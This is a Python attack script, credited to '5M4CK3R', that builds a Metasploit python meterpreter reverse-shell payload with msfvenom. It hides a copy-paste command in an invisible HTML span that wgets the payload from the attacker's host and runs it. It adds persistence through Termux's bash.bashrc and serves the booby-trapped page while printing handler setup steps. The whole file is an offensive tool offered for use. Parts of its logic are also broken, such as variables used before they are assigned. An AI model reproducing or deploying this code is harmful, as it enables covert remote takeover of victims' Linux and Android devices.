from time import sleep
import os
import http.server
import socketserver
def window():
	print('Sorry Not Avaliable Now Will Be Added Soon .....')
	exit()
 
def linux():
	print('Please Wait while Creating A Payload ....')
	lhost = input('Enter The LocalHost : ')
	lport = input('Enter The Port')
	print('Please Wait While Creating Payload ...')
	os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + lhost + ' LPORT=' + lport + ' -o hack.py')
	os.system('clear')
	print('')
	print('<<<--- Please Wait While injecting backdoor --->>>')
	print('')
	print('File Is Ready Please Wait .....')
	sleep(2)
	os.system('clear')
	print('')
	path = input('Enter The Path And Name Of The Html File file : ')
	print('')
	sleep(2)
	texte = input('Enter The Text which should be exchange : ')
	print('')
	sleep(1)
	print('')
	sleep(1)
	text = texte.split()
	length = len(text)
	counter = 2
	with open(path, 'r') as op:      # check weather input data is present in the foel or not ...
		data = op.read()
		if not text[0] in data:
			print('sorry Text you enter not found please try agan ...')
			print('')
			exit()
	while counter < length:
		counter = counter + 1
		retrive = text[counter - 1]
		retrive = retrive.replace('\n', ' ')
		with open('data.txt', 'a') as wrt:
			wrt.write(' ' + retrive)
	with open('data.txt', 'r') as op:      # Read data of the data.txt  file
		other_data = op.read()
	if length > 2:
		other = True
	else:
		other = False
	if other == True:
		code = text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' && clear && wget ' + ip + ':' + port + '/hack.py && clear && chmod +x hack.sh && mv hack.py $root/usr/bin/ && python $root/usr/bin/hack.py && clear <br>' + text[0] + ' </span>' + text[1] + other_data
	elif other == False:
		code = text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' &&  clear && wget ' + ip + ':' + port + '/hack.py && clear && chmod +x hack.py && mv hack.py $root/usr/bin/ && python $root/usr/bin/hack.py && clear <br>' + text[0] + '</span>' + text[1]
	else:
		print('Sorry Somthing went Wrong Please Try agan ....')
		exit()
	data = data.replace(texte, code)
	with open('/web/index.html', 'w') as opt:# write the all cod in a html document
		opt.write(data)
		print('done ...')
	with open('data.txt', 'w') as op: pass
	print('<<<--- Your file Is Hase Been Saved As A index.html --->>>')
	print('')
	sleep(2)
	os.system('clear')
	port = int(input('Enter The Port Number for website : '))
	print('')
	ip = input('Enter Your host for website : ')
	print('')
	start_service(ip , port)
	exit()


def android():
	print('Please Wait while Creating A Payload ....')
	print('')
	lohost = input('Enter The LocalHost : ')
	print('')
	loport = input('Enter The Port : ')
	print('')
	print('Please Wait While Creating Payload ...')
	os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + str(lohost) + ' LPORT=' + str(loport) + ' -o web/hack.py')
	os.system('clear')
	print('')
	print('<<<--- Please Wait While injecting backdoor --->>>')
	print('')
	with open('web/hack.py' , 'a') as op:
		op.write('\nimport os')
		op.write('\nos.system("mv hack.py /data/data/com.termux/files/usr/bin/")')
		op.write('\nwith open("/data/data/com.termux/files/usr/bin/hack.py" , "r") as re:')
		op.write('\n    data = re.readline()')
		op.write('\nwith open("/data/data/com.termux/files/usr/etc/bash.bashrc" , "a") as op:')
		op.write('\n    op.write("python /data/data/com.termux/files/usr/bin/hack.py")')
		op.write('\nwith open("/data/data/com.termux/files/usr/bin/hack.py" , "a") as op:')
		op.write('\n    op.write(data)')
	print('')
	print('File Is Ready Please Wait .....')
	sleep(2)
	os.system('clear')
	print('')
	path = input('Enter The website address : ')
	print('')
	os.system('wget -O websi.html ' + path)
	sleep(1)
	os.system('clear')
	texte = input('Enter The Text which should be exchange : ')
	print('')
	text = texte.split()
	length = len(text)
	counter = 2
	if not os.path.exists('websi.html'):
		print('Enter The Correct website address or check your internet connection')
	os.system('mv websi.html web')
	with open('web/websi.html', 'r') as op:          # check weather input data is present in the file or not ...
		data = op.read()
		if not text[0] in data:
			print('sorry Text you enter not found please try agan ...')
			print('')
			exit()
	while counter < length:      # add other data which is extra stuff and save it to data.txt file
		counter = counter + 1
		retrive = text[counter - 1]
		retrive = retrive.replace('\n', ' ')
		with open('data.txt', 'a') as wrt:
			wrt.write(' ' + retrive)
	with open('data.txt', 'r') as op:   # Read data of the data.txt  file
		other_data = op.read()
	if length > 2:
		other = True
	else:
		other = False
	os.system('clear')
	port = int(input('Enter The Port Number for website : '))
	print('')
	ip = input('Enter Your host for website : ')
	print('')
	if other == True:
		code = text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; ">' + text[1] + ' && wget ' + ip + ':' + str(port) + '/hack.py && clear && chmod +x hack.sh && mv hack.py /data/data/com.termux/files/usr/bin/ && python /data/data/com.termux/files/usr/bin/hack.py && clear <br>' + text[0] + ' </span>' + text[1] + other_data
	elif other == False:
		code = text[0] + ' <span style="Position: absolute; left: -2000; top: -100px; "> ' + text[1] + ' && wget ' + ip + ':' + str(port) + '/hack.py && clear && chmod +x hack.py && mv hack.py /data/data/com.termux/files/usr/bin/ && python /data/data/com.termux/files/usr/bin/hack.py && clear <br>' + text[0] + '</span>' + text[1]
	else:
		print('Sorry Somthing went Wrong Please Try agan ....')
		exit()
	data = data.replace(texte, code)
	with open('web/index.html', 'w') as opt:  # write the all cod in a html document
		opt.write(data)
		sleep(2)
		print('')
	with open('data.txt', 'w') as op:
		pass
	print('<<<--- Your file Is please wait while starting leasining  --->>>')
	print('')
	sleep(2)
	start_service(ip , port)
	exit()


def main():
	os.system('rm -rf web/*')
	os.system('clear')
	print('''
    
##########   #########  #########   #########   
##           ##         ##          ##     ##
##           ######     ######      #########
##           ##         ##          ## 
##########   #########  #########   ##
        
    CREATED BY > 5M4CK3R

    ''')

	print('''

1 > Window / Any Window
  
2 > Linux / Any Operating System of linux
  
3 > Termux / Android

''')
	options = int(input(' Select --->>> '))
	if options == 1:
		print('')
		window()
	elif options == 2:
		print('')
		linux()
	elif options == 3:
		os.system('clear')
		print('')
		android()
	else:
		print('Please Chuse The Write Otions ....')
	exit()

def start_service(ip , port):
		os.chdir('web')
		print('start your metasploit and there type these commands ....')
		print('msfconsole')
		print('use exploit/multi/handler')
		print('set payload python/meterpreter/reverse_tcp')
		print('set LHOST (your port for creating payload)')
		print('set LPORT (your port for creating payload)')
		print('exploit')
		Handler = http.server.SimpleHTTPRequestHandler
		with socketserver.TCPServer((ip , port),Handler) as httpd:
			print("done your are ready now just open " + str(ip) + ':' +  str(port) + ' website and you are ready ....')
			httpd.serve_forever()
main()